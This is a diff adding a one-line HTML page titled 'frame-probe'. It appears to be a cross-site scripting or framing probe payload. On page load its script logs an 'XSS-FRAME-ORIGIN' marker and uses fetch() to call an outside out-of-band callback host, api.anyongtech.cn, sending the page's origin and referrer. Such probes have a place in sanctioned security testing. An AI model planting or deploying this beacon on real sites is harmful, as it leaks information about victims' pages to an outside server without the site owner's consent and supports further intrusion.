@@ -1,0 +1,1 @@
+<!doctype html><html><head><meta charset="utf-8"></head><body><h1>frame-probe</h1><script>console.log("XSS-FRAME-ORIGIN", location.origin); fetch("https://api.anyongtech.cn/ws-oob/cb/ampprobe1/frame?origin="+encodeURIComponent(location.origin)+"&top="+encodeURIComponent((document.referrer||"")));</script></body></html>
